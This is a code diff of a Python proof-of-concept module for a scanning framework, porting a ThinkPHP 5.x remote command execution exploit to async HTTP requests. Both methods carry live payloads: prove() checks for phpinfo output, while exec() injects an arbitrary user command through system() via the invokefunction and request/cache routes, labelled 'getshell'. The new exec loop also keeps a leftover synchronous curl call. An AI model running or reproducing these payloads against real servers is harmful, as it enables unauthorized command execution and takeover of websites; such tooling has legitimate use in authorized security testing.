@@ -3,6 +3,7 @@
 # @author: 'orleven'
 
 from urllib import parse
+from lib.utils.connect import ClientSession
 from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
@@ -20,29 +21,32 @@ class POC(Script):
         self.refer = 'https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ,http://www.vulnspy.com/cn-thinkphp-5.x-rce/thinkphp_5.x_(v5.0.23%E5%8F%8Av5.1.31%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC)_%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88getshell%EF%BC%89/'
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        self.get_url()
+    async def prove(self):
+        await self.get_url()
         if self.base_url:
-            pocs = ["/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
-                    "/index.php?s=/index/\\think\\request/cache&key=1|phpinfo"]
+            pocs = ["index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
+                    "index.php?s=/index/\\think\\request/cache&key=1|phpinfo"]
             path_list = list(set([
                 self.url_normpath(self.base_url, '/'),
                 self.url_normpath(self.base_url, 'public/'),
                 self.url_normpath(self.url, './'),
                 self.url_normpath(self.url, './public/'),
             ]))
-            for path in path_list:
-                for poc in pocs:
-                    url = path + poc
-                    res = self.curl('get', url)
-                    if res != None and 'PHP Version' in res.text:
-                        self.flag = 1
-                        self.req.append({"flag": url})
-                        self.res.append({"info": url, "key": "thinkphp 5.1.31 getshell"})
-                        break
+            async with ClientSession() as session:
+                for path in path_list:
+                    for poc in pocs:
+                        url = path + poc
+                        async with session.get(url=url) as res:
+                            if res != None:
+                                text = await res.text()
+                                if 'PHP Version' in text:
+                                    self.flag = 1
+                                    self.req.append({"flag": url})
+                                    self.res.append({"info": url, "key": "thinkphp 5.1.31 getshell"})
+                                    break
 
-    def exec(self):
-        self.get_url()
+    async def exec(self):
+        await self.get_url()
         if self.base_url:
             pocs = ["/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%s" %parse.quote_plus(data['cmd']),
                     "/index.php?s=/index/\\think\\request/cache&key=%s|system" %parse.quote_plus(data['cmd'])]
@@ -52,11 +56,14 @@ class POC(Script):
                 self.url_normpath(self.url, './'),
                 self.url_normpath(self.url, './public/'),
             ]))
-            for path in path_list:
-                for poc in pocs:
-                    url = path + poc
-                    res = self.curl('get', url)
-                    if res != None and res.status_code == 200:
-                        self.flag = 1
-                        self.req.append({"flag": url})
-                        self.res.append({"info": res.text, "key": "thinkphp 5.1.31 getshell"})
+            async with ClientSession() as session:
+                for path in path_list:
+                    for poc in pocs:
+                        url = path + poc
+                        res = self.curl('get', url)
+                        async with session.get(url=url) as res:
+                            if res != None and res.status == 200:
+                                text = await res.text()
+                                self.flag = 1
+                                self.req.append({"flag": url})
+                                self.res.append({"info": text, "key": "thinkphp 5.1.31 getshell"})
